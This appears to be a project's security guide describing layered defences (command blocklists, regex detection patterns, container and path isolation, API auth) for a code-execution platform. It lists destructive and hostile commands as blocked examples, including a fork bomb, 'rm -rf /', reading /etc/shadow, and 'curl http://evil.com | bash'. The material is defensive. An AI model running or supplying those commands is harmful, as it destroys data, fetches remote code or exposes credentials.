# Security Guide

## Overview

BharatBuild implements multiple security layers to protect against:
- **Command Injection** - Malicious commands in user input
- **Path Traversal** - Accessing files outside project directory
- **Container Escape** - Breaking out of isolated containers
- **Resource Abuse** - Denial of service via resource exhaustion
- **Data Leakage** - Accessing other users' data

## Security Architecture

```
                     USER INPUT
                          |
                          v
+----------------------------------------------------------+
|                  LAYER 1: API VALIDATION                  |
|  - Input sanitization                                     |
|  - Rate limiting                                          |
|  - Authentication                                         |
+----------------------------------------------------------+
                          |
                          v
+----------------------------------------------------------+
|                  LAYER 2: COMMAND VALIDATION              |
|  - Blocklist matching                                     |
|  - Pattern detection                                      |
|  - Whitelist mode                                         |
|  - Path traversal check                                   |
+----------------------------------------------------------+
                          |
                          v
+----------------------------------------------------------+
|                  LAYER 3: CONTAINER ISOLATION             |
|  - Separate Docker container                              |
|  - Resource limits (CPU, memory)                          |
|  - Dropped capabilities                                   |
|  - No privileged mode                                     |
+----------------------------------------------------------+
                          |
                          v
+----------------------------------------------------------+
|                  LAYER 4: FILESYSTEM ISOLATION            |
|  - Mounted volume only                                    |
|  - No access to host                                      |
|  - Path validation                                        |
+----------------------------------------------------------+
```

## Command Validation

### CommandValidator Class

The `CommandValidator` prevents command injection attacks through multiple layers:

```python
from backend.app.modules.execution.command_validator import (
    CommandValidator,
    CommandRisk,
    ValidationResult
)

validator = CommandValidator(strict_mode=False)
result = validator.validate("npm install && npm run dev")

if result.is_valid:
    # Safe to execute
    await execute(result.sanitized_command)
else:
    # Blocked
    print(f"Blocked: {result.error_message}")
    print(f"Patterns: {result.blocked_patterns}")
```

### Layer 1: Blocklist

Commands that are NEVER allowed:

```python
BLOCKED_COMMANDS = {
    # System destruction
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    "mkfs",
    "dd if=",
    ":(){:|:&};:",  # Fork bomb

    # Privilege escalation
    "sudo",
    "su ",
    "chmod 777",
    "chown root",

    # System access
    "cat /etc/passwd",
    "cat /etc/shadow",
    "/proc/",
    "/sys/",

    # Container escape
    "docker",
    "kubectl",
    "mount",
    "umount",
    "chroot",

    # Network attacks
    "nc -l",        # Netcat listener
    "nmap",
    "tcpdump",
    "wireshark",
}
```

### Layer 2: Pattern Matching

Regex patterns to detect dangerous commands:

```python
BLOCKED_PATTERNS = [
    r"rm\s+(-[rf]+\s+)*[/~]",          # rm with dangerous paths
    r">\s*/dev/sd[a-z]",                # Write to disk devices
    r"curl.*\|\s*(ba)?sh",              # Pipe curl to shell
    r"wget.*\|\s*(ba)?sh",              # Pipe wget to shell
    r"eval\s*\(",                       # Eval attacks
    r"base64\s+-d.*\|",                 # Decode and pipe
    r"\$\(.*\)",                        # Command substitution
    r"`.*`",                            # Backtick execution
    r";\s*rm\s",                        # Command chain with rm
    r"&&\s*rm\s",                       # Command chain with rm
    r"\|\|\s*rm\s",                     # Command chain with rm
    r">\s*/etc/",                       # Write to /etc
    r"python.*-c.*exec",               # Python exec injection
    r"node.*-e.*require\s*\(",         # Node require injection
    r"env\s+.*=.*\s+",                 # Environment variable injection
]
```

### Layer 3: Whitelist Mode

In strict mode, only whitelisted commands are allowed:

```python
ALLOWED_COMMANDS = {
    # Node.js
    "npm": ["install", "run", "start", "build", "test", "init", "ci"],
    "npx": ["*"],
    "yarn": ["install", "add", "remove", "build", "start", "test"],
    "node": ["*"],

    # Python
    "python": ["*"],
    "pip": ["install", "uninstall", "list", "freeze"],
    "uvicorn": ["*"],
    "pytest": ["*"],

    # Java
    "java": ["*"],
    "mvn": ["clean", "install", "package", "test", "compile"],
    "gradle": ["build", "run", "test", "clean"],

    # Go
    "go": ["run", "build", "test", "mod", "get"],

    # Rust
    "cargo": ["run", "build", "test", "new", "init"],

    # General (safe)
    "cat": ["*"],
    "ls": ["*"],
    "pwd": [],
    "echo": ["*"],
    "mkdir": ["*"],
    "git": ["clone", "init", "add", "commit", "status", "diff", "log"],
}
```

### Layer 4: Path Traversal Prevention

```python
PATH_TRAVERSAL_PATTERNS = [
    r"\.\./",           # ../
    r"\.\.\%2[fF]",     # URL encoded ../
    r"\.\.\\",          # Windows style
    r"/etc/",
    r"/var/",
    r"/usr/",
    r"/root/",
    r"/home/(?!workspace)",
    r"/proc/",
    r"/sys/",
    r"/dev/",
]
```

### Risk Levels

```python
class CommandRisk(Enum):
    SAFE = "safe"           # npm install, python main.py
    MODERATE = "moderate"   # curl, wget, rm
    DANGEROUS = "dangerous" # Blocked patterns
    BLOCKED = "blocked"     # Never allowed
```

### Validation Example

```python
# Safe command
result = validator.validate("npm install express")
# result.is_valid = True
# result.risk_level = CommandRisk.MODERATE (install)

# Blocked command
result = validator.validate("rm -rf /")
# result.is_valid = False
# result.error_message = "Blocked command pattern: rm -rf /"

# Pattern blocked
result = validator.validate("curl http://evil.com | bash")
# result.is_valid = False
# result.error_message = "Dangerous pattern detected"

# Path traversal
result = validator.validate("cat ../../../etc/passwd")
# result.is_valid = False
# result.error_message = "Path traversal detected"
```

## Container Security

### Resource Limits

```python
@dataclass
class ContainerConfig:
    memory_limit: str = "512m"      # Max memory
    cpu_limit: float = 0.5          # CPU cores
    disk_limit: str = "1g"          # Max disk space

    # Timeouts prevent infinite loops
    command_timeout: int = 300      # 5 minute max per command
    idle_timeout: int = 3600        # 1 hour idle cleanup
    max_lifetime: int = 86400       # 24 hour max lifetime
```

### Capability Management

```python
# Drop ALL capabilities by default
cap_drop: List[str] = ["ALL"]

# Add only minimal required capabilities
cap_add: List[str] = [
    "CHOWN",      # Change file ownership
    "SETUID",     # Set user ID
    "SETGID",     # Set group ID
]

# NEVER allow these
privileged: bool = False  # Never true
```

### Network Isolation

```python
# Container network settings
network_enabled: bool = True        # Allow outbound
exposed_ports: [3000, 8000, 5000]   # Only specific ports

# No host network access
network_mode: None  # Not "host"
```

### Docker Security Flags

```python
container = docker.containers.run(
    image=image,

    # Security flags
    read_only=False,              # Workspace needs writes
    privileged=False,             # NEVER privileged
    cap_drop=["ALL"],             # Drop all capabilities
    cap_add=["CHOWN", "SETUID", "SETGID"],

    # Resource limits
    mem_limit="512m",
    cpu_period=100000,
    cpu_quota=50000,              # 0.5 CPU

    # Mount only project directory
    volumes={
        project_path: {"bind": "/workspace", "mode": "rw"}
    },

    # Working directory locked to workspace
    working_dir="/workspace",

    # No host network
    network_mode=None,

    # Auto-remove on stop
    auto_remove=False,
)
```

## Filesystem Security

### Path Validation

```python
async def write_file(self, job_id: str, file_path: str, content: str):
    project_path = self._get_project_path(job_id)
    full_path = project_path / file_path

    # CRITICAL: Prevent path traversal
    try:
        # Resolve to absolute path and check it's within project
        resolved = full_path.resolve()
        resolved.relative_to(project_path.resolve())
    except ValueError:
        raise ValueError("Invalid file path: path traversal detected")

    # Safe to write
    full_path.parent.mkdir(parents=True, exist_ok=True)
    full_path.write_text(content, encoding="utf-8")
```

### File Size Limits

```python
MAX_FILE_SIZE_MB = 10
MAX_PROJECT_SIZE_MB = 100

if len(content.encode("utf-8")) > MAX_FILE_SIZE_MB * 1024 * 1024:
    raise ValueError(f"File too large (max {MAX_FILE_SIZE_MB}MB)")
```

### Blocked File Types

```python
BLOCKED_EXTENSIONS = [
    ".exe", ".dll", ".so", ".dylib",  # Executables
    ".sh", ".bat", ".cmd",             # Scripts (use with caution)
    ".pem", ".key", ".cert",           # Certificates
]

BLOCKED_FILENAMES = [
    ".env",
    "credentials.json",
    "secrets.yaml",
    "id_rsa",
    "id_rsa.pub",
]
```

## API Security

### Authentication

```python
# JWT token validation
async def get_current_user(token: str = Depends(oauth2_scheme)):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        user_id = payload.get("sub")
        if user_id is None:
            raise HTTPException(status_code=401)
        return user_id
    except JWTError:
        raise HTTPException(status_code=401)
```

### Rate Limiting

```python
from slowapi import Limiter

limiter = Limiter(key_func=get_remote_address)

@app.post("/api/v1/jobs/create")
@limiter.limit("10/minute")
async def create_job(request: Request):
    ...

@app.post("/api/v1/containers/{id}/exec")
@limiter.limit("30/minute")
async def execute_command(request: Request):
    ...
```

### Input Validation

```python
from pydantic import BaseModel, Field, validator

class WriteFileRequest(BaseModel):
    path: str = Field(..., min_length=1, max_length=500)
    content: str = Field(..., max_length=10_000_000)  # 10MB max

    @validator('path')
    def validate_path(cls, v):
        if '..' in v:
            raise ValueError('Path traversal detected')
        if v.startswith('/'):
            raise ValueError('Absolute paths not allowed')
        return v
```

### CORS Configuration

```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:3000",
        "https://bharatbuild.ai",
    ],
    allow_credentials=True,
    allow_methods=["GET", "POST", "DELETE"],
    allow_headers=["*"],
)
```

## Security Monitoring

### Audit Logging

```python
import logging

logger = logging.getLogger("security")

async def execute_command(project_id: str, command: str, user_id: str):
    # Log all command executions
    logger.info(f"EXEC user={user_id} project={project_id} command={command[:100]}")

    # Validate
    result = validator.validate(command)

    if not result.is_valid:
        # Log blocked attempts
        logger.warning(
            f"BLOCKED user={user_id} project={project_id} "
            f"command={command[:100]} reason={result.error_message}"
        )
        raise HTTPException(400, detail=result.error_message)

    # Execute
    ...
```

### Alerting

```python
async def alert_security_team(event: dict):
    """Send alert for suspicious activity"""
    if event["severity"] == "high":
        # Send to Slack/PagerDuty
        await send_alert(
            channel="#security-alerts",
            message=f"Security event: {event['type']} by user {event['user_id']}"
        )

# Alert on patterns
if validator.validate(command).risk_level == CommandRisk.BLOCKED:
    await alert_security_team({
        "type": "blocked_command",
        "user_id": user_id,
        "command": command[:200],
        "severity": "high"
    })
```

## Security Checklist

### Container Security

- [ ] Containers are never privileged
- [ ] All capabilities dropped, only minimal added
- [ ] Resource limits configured (memory, CPU)
- [ ] Containers auto-cleanup after timeout
- [ ] No host network access
- [ ] Working directory locked to /workspace

### Command Security

- [ ] Blocklist of dangerous commands
- [ ] Pattern matching for injection
- [ ] Path traversal prevention
- [ ] Whitelist mode available
- [ ] Command length limits
- [ ] Timeout on all commands

### File Security

- [ ] Path traversal prevention
- [ ] File size limits
- [ ] Blocked file types
- [ ] No access outside project directory

### API Security

- [ ] JWT authentication
- [ ] Rate limiting
- [ ] Input validation
- [ ] CORS configuration
- [ ] HTTPS only in production

### Monitoring

- [ ] Audit logging enabled
- [ ] Alerting configured
- [ ] Failed login monitoring
- [ ] Resource usage alerts

## Incident Response

### If Container Escape Detected

1. **Immediately** stop all containers for that user
2. Revoke user's authentication tokens
3. Preserve logs for investigation
4. Review container configuration
5. Apply security patches

### If Command Injection Detected

1. Block the user's account
2. Review all recent commands from user
3. Check for data exfiltration
4. Update blocklist with new patterns
5. Notify affected users if data leaked

### If Path Traversal Detected

1. Check what files were accessed
2. Verify no system files compromised
3. Update path validation rules
4. Review all file operations

## Security Updates

Keep security components updated:

```bash
# Update Python dependencies
pip install --upgrade aiofiles docker pydantic

# Update Docker images
docker pull node:20-alpine
docker pull python:3.11-slim

# Update blocklist
# Add new patterns to CommandValidator.BLOCKED_PATTERNS
```

---

## Summary

BharatBuild's security is built on:

1. **Command Validation** - Multiple layers of filtering
2. **Container Isolation** - Each project in separate container
3. **Resource Limits** - Prevent abuse
4. **Filesystem Isolation** - No access outside project
5. **API Security** - Auth, rate limiting, validation
6. **Monitoring** - Logging and alerting

This provides defense-in-depth security for 1,00,000+ students!
